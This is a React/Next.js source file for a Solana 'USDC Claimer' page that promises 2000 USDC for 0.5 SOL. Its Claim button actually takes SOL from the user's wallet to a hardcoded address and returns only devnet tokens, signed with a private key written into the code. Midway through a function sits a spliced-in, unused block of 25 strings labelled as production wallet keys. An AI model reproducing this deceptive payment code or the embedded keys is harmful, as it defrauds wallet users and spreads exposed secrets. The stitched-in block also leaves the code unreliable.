/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2TLRfQYAMorv6LoEsJcCBcHttD5yWAr8riVqGFReukGmg4Q1na4yerDa5rHry4333mLQB5WLLk2xiFoZRJDT9Erv"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5PhEe1x4gFKDYwXTERZ9oewSK2uA9YehE9KC7SMrrtwThqsr5tK1niaJk4A8cGjpox3kaD74HvD2FstJLLUkUYAL",
  "key1": "5zvQdX843xnjzmXF5bSchBpGzAMYzneH6VhxVU7SGvxnWp6M4wivzdFaduFvz9GnJyRsPmLr2KpX8Apsf3KAxabW",
  "key2": "2FsLLTp2M7RyWgKFJQGTVx1uZs6ut5G9czGB4ecrjsWmsh7DikmBptYCKGV7gKQpy9tKgd4aHXDjZRXrGFagwi9x",
  "key3": "3k6AvCvbvh8w8seBWXJCsH53fqMQsnnGm6iTNYaWYzv5CjnrWFXtgxnwNMsK2RizqW8Z4a4ieL6S4LZxmkoRwhqA",
  "key4": "gCtn5uuceXzhuQVeZ8HU5U8aSL9zB7Ja5NkFdsLAUFfwo2dFCoBgy3fHfMpwrmbJTLoswDzr1eX6jzY7rZEapWR",
  "key5": "3yq3TStHbMSqUmyNdeTBgnKDyxdJXNWKCF17FcKQ1VV1Fujhqmq3W1kt5je62hQY28TfLW8Ad55n6cYnbvoNzpZR",
  "key6": "2T87dKTN2C2FYN6b18JPPGnsL3thzjpEK2ZYLj2dGvrPrkonVhtnx8GasCHpN1o1ADquZcTk5PmJKVLZ38BJCKH9",
  "key7": "58xjGbDwZ6ZNxdiuLkKQ6cKvdGFTKFerDah6n3TU5vjoM62STFh9nxGUbi4DB9RLd6jg2FxqsH9b5F1awGWpEBvi",
  "key8": "3QbUdGw92A2jnKb6XccmqTXwU1DEWcsoadacnjUyhQV6sSMRY28VKCKLQCeqdYqrdo58BaxqvKeSZHL9TMF491r3",
  "key9": "5E9hNFCe219GmqSawLyGUfttRGo2ETH9WCBALZhiQCyevPe2jPzxt5NbqcYkUwiTRU9eRKaUg3HRHA8X37BrpqKs",
  "key10": "4zxVeFGX83jj3wRu2crA7oZkoSaceFM7pD1iPXuyFw9hAc2NToR8ZsU4swtyALDm57D1EHhci4wb5mJ1hLMr1zwD",
  "key11": "4PzddoN5VAP3tEGkDQthVUc7BrTbBotbAYEN1cuX7Vv25ZfXLBHCaRR4CYNHR5jdgQSfxZYSxd5xGTDuq8Qi4TBp",
  "key12": "54wR1cNMKAQ2ytoqZhgjrcqPEjLbt69TGBY5BoaJQMWav4YTCUiyKWButDovCtfQvyWXi2C8xkujGr8nGj4eBcFH",
  "key13": "2F7WSuYtBeUkWu8RfFEhPHvzBvqhuAhQTwqZpAGSjWZR2ELAteKeUbhQVv7yUz8VfNKmXby9BB8vntWsiPK1HU73",
  "key14": "5s6Y462inz2qbcC5sGtR3DLCcDu1t6mk7VzVz1uuRLbFFownskSDMEKhf6kVH7ZUXdYA9oHjTi1Q9j6GfBDzGpKj",
  "key15": "2tMU4SoAn19REaMWs2tLJb3cQqyTTm2GPrCY7BRXnXryEzzftjNRCgh6nGhXhpSkW3wzW9TSSxFJXDpya1xwrJLg",
  "key16": "2GXYUuXC2fPFUjWFF3xPngwh26SRGwzRurGnYd7J1vNDqV9K6PHMCevQtpxNjvPVXN3gp5yyG9psHvAbUWAH1AtS",
  "key17": "KPLonnQwJnZjR4b7prpB73Ez425Ymr7ZvdoM9m3vZ7cXnEKoVVm85MVYKDVcyG4x6e1UczS1te6Mg3QYgG9voRM",
  "key18": "3EK9vuVGkveQQjnV1NNGnNqGowJjh9wTRWkYonKFJFGpZLii8B3QyZLXzduqf1byfXKfX4KUX5Lvw2kKAU4dP1Q2",
  "key19": "33ve4HSsXL3sL8eimJ8RDtQisLmwnM7Yx1kRGz92K6ecy86PmPdFiTcThiY9db1aWzphkukjcRU94iH12KcswYGh",
  "key20": "4FSJ7NiiVdy8Gd3V5uiHvb8uecLTTYHmMtoZFKSJRDtqZGDz5Rd21XhuteDu5A1pxBQMsjXH8miGmw8JSz5y8ymW",
  "key21": "41ed7AKEccw4TKs7tH5kE1WfYZRfktv99DXs95vCxu7LZ3JuUhGppCxmPfEy3uRVTR92fgzV8mjEYGBdqeMhfyox",
  "key22": "4wWAWbzFgUG8shoEfVnTVtGvmu3XmC5mCeJeVzLKbQoktiMsFcxq2CfrGZrNUkC5aPkrVQ2jYq5LLFzR8ScwhKW4",
  "key23": "7oUpzQ16bAGjTop2YNYJRK8EpC24CktALXtRyVbTBGbAzvZQcozxnNjmCpGWzdY4k3uKgFuFNizTKU5ZDtcwv1v",
  "key24": "zhRCzMFcKWHowMwE1xehCMDAzayMvxksbxwvjHekMgb1ek44fTpmS3ZUbTXCwtuhsBhxpWfvLsREJstbF3np4TD"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
